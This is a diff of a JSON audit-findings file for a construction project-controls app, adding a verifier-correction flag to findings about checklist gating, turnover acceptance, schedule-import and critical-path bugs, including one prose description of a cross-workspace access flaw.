       "summary": "A member whose role loses Admin/DocCtrl mid-session (or a deployment where 20261013 has not been applied to a replica) opens a 120-item PSSR with 60 open items and clicks \"Mark complete.\" listChecklistItems returns [] because the SELECT was denied; the gate passes; projectchecklists.status is set to complete. The card renders the emerald \"complete\" badge with the shield icon. The checklist then co",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/03-quality.md"
@@ -1162,6 +1217,7 @@
         "app/(protected)/projects/[id]/page.tsx:645-650",
         "components/projects/QualityTab.tsx:14-17"
       ],
+      "has_verifier_correction": false,
       "summary": "A project owner reads \"Closeout is gated on acceptance\" and reasonably concludes the system will stop them if turnover is incomplete. It does not — Confirm is disabled only on transitionBusy. The project closes with four turnover items never delivered, and per SAF-14 the audit row preserves no snapshot of which gates were open. The owner's mental model of what the platform enforces is wrong in the",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/03-quality.md"
@@ -1182,6 +1238,7 @@
         "app/(protected)/projects/[id]/page.tsx:340-348",
         "lib/exportTables.ts"
       ],
+      "has_verifier_correction": true,
       "summary": "An auditor asks for the compliance package on the Unit 300 repipe. The owner clicks \"Evidence pack\" and prints a PDF containing the team roster, the Gantt task list, the transmittal receipts, and a wall of audit JSON. The completed PSSR, the accepted turnover package with reviewer names and dates, and the closed punch list — the documents the auditor actually asked for — are not in it. There is no",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/03-quality.md"
@@ -1202,6 +1259,7 @@
         "lib/checklistEngine.ts:176",
         "lib/turnover.ts:223-234"
       ],
+      "has_verifier_correction": true,
       "summary": "A reviewer accepts \"Material certs (MTRs)\" and afterwards finds the heat numbers do not trace to what was installed — a B31.3 material-traceability failure. There is no way to undo the acceptance in the app. The turnover progress keeps counting it toward accepted, the closeout gate keeps reading \"Turnover package fully accepted\", and computeTurnoverProgress keeps it out of outstanding. The only re",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/03-quality.md"
@@ -1222,6 +1280,7 @@
         "supabase/migrations/20261013_project_controls_program.sql:153-155",
         "lib/exportTables.ts:104"
       ],
+      "has_verifier_correction": true,
       "summary": "A project owner in workspace A inserts checklistitems rows against their own checklist while setting orgid to workspace B's id. The rows satisfy checklistitemswrite (they own the parent project) and thereafter satisfy checklistitemsmemberread for every active member of workspace B. Workspace B's users can read attacker-authored text — item wording, evidence labels, manual notes — attributed to the",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/03-quality.md"
@@ -1243,6 +1302,7 @@
         "lib/checklists.ts:266-282",
         "supabase/migrations/20261013_project_controls_program.sql:181"
       ],
+      "has_verifier_correction": true,
       "summary": "QA/QC accepts the \"NDE reports\" turnover item after reading a 40-page package. The row records status: accepted, reviewedbyname: 'jchen', reviewedat, and a note — and nothing that identifies which document was reviewed. Six months later the NDE package is superseded or three candidate files exist in the folder; nobody can establish which one jchen accepted. Meanwhile the checklist engine, which wa",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/03-quality.md"
@@ -1262,6 +1322,7 @@
         "lib/scheduleParsers.ts:479-502",
         "lib/scheduleParsers.ts:527-557"
       ],
+      "has_verifier_correction": true,
       "summary": "A scheduler exports from P6 at the EPS node — the usual way to get \"the outage\" when it spans two units — or simply exports a file that still contains a second project. Every activity from both projects imports into the one selected project. The board now shows another unit's work as top-level phases; overall percent complete, SPI, the critical path, the overdue count and the health score are all ",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/02-scheduling.md"
@@ -1281,6 +1342,7 @@
         "lib/scheduleProgress.ts:139-146",
         "lib/__tests__/scheduleProgress.test.ts:46-50"
       ],
+      "has_verifier_correction": true,
       "summary": "A night-shift phase contains four hydrotest tasks; the shift is lost and all four are marked missed. The phase row on the timeline, the calendar tile and the planning list renders with the blue \"Planned\" dot at 0% — visually identical to work that has not started yet. Collapse the phase (the default for a 500-row turnaround) and the missed work is invisible: SchedulePulse surfaces overdue and bloc",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/02-scheduling.md"
@@ -1301,6 +1363,7 @@
         "lib/scheduleParsers.ts:710",
         "lib/milestones.ts:1090-1099"
       ],
+      "has_verifier_correction": true,
       "summary": "A planner exports a schedule from MS Project with both Unique ID and ID columns (the default when both are on the Gantt). Rows key on Unique ID; predecessor tokens are IDs. In a file that has been edited over time the two numberings diverge, so msp:14 as a predecessor resolves to whatever task holds Unique ID 14 — a real, unrelated task. The board draws a confident FS arrow between them, cascadeDe",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/02-scheduling.md"
@@ -1321,6 +1384,7 @@
         "lib/scheduleFilter.ts:104",
         "lib/scheduleFilter.ts:26-27"
       ],
+      "has_verifier_correction": true,
       "summary": "A planner in UTC+5:30 imports a schedule whose night-shift tasks start at 19:00 plant time. new Date(\"2026-06-01T19:00:00\") is 13:30Z for that browser, so getUTCHours is 13 and the tasks are labelled \"day\". The night supervisor filters the board by Shift = night (scheduleFilter.ts:104) and the shift's work is missing. Because the label is stored, not derived, re-importing from a different machine ",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/02-scheduling.md"
@@ -1341,6 +1405,7 @@
         "components/projects/ExecutionReportView.tsx:86-87",
         "components/projects/ExecutionView.tsx:1503-1504"
       ],
+      "has_verifier_correction": true,
       "summary": "A supervisor turns on Critical path to decide where to put the extra crew. On a schedule with two parallel finishing chains, the highlight covers both, including a task with three days of float — so the crew is moved onto work that cannot pull the finish in. On a schedule whose true driver is an 8-week vendor delivery, that item is not highlighted at all, because its finish is more than 14 days be",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/02-scheduling.md"
@@ -1360,6 +1425,7 @@
         "lib/milestones.ts:321-326",
         "supabase/migrations/20260907_milestone_batch_move.sql:49-59"
       ],
+      "has_verifier_correction": true,
       "summary": "Someone asks why a hydrotest moved four days. The task's activity panel (listMilestoneNotes, :557-563) shows status changes only — no reschedule entries, because every move came through a drag. The project audit log holds one MILESTONESRESCHEDULED row per drag with a count and up to 50 ids and no before/after dates, and if that insert was rejected by RLS or a transient error, nothing anywhere reco",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/02-scheduling.md"
@@ -1380,6 +1446,7 @@
         "components/projects/ExecutionView.tsx:1503-1504",
         "lib/executionReport.ts:179-190"
       ],
+      "has_verifier_correction": true,
       "summary": "An end-of-job report is printed and filed as the schedule record for a PSM-regulated outage. It states a forecast finish derived from average tasks-per-day, a percent-complete that is really a task count (finding 3), and — on the timeline the crew worked from — an unqualified \"critical path\". Separately, a planner who is refused an .mpp upload is told the XML route loses nothing, exports the XML, ",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/02-scheduling.md"
@@ -1398,6 +1465,7 @@
         "lib/scheduleReflow.ts:438",
         "lib/__tests__/dependencies.test.ts:28-49"
       ],
+      "has_verifier_correction": true,
       "summary": "A 20-link weld/NDE/hydrotest chain is imported with 08:00–17:00 activity times and correct FS relationships. The first drag triggers withCascade (ExecutionView.tsx:449-461), which pushes every downstream task so that each starts exactly 24 hours after its predecessor's 17:00 finish. Twenty tasks now start at 17:00, their day/night shift labels (assigned once at import, never recomputed) are stale,",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/02-scheduling.md"
@@ -1419,6 +1487,7 @@
         "lib/milestones.ts:663-669",
         "components/projects/TaskDetailPanel.tsx:520"
       ],
+      "has_verifier_correction": true,
       "summary": "A planner tags the eight biggest jobs on a 400-task turnaround with their real hours (say 40h each) and leaves the rest untouched. Those eight now carry weight 40 against 392 rows carrying weight 1: 320 of 712 total weight, 45% of the project, sits on 2% of the tasks. Overall completion, every phase's pctComplete, SPI and earned value swing by tens of points the moment those eight tasks change sta",
       "area": "projects-and-cost",
       "report": "audit-reports/projects-and-cost/02-scheduling.md"
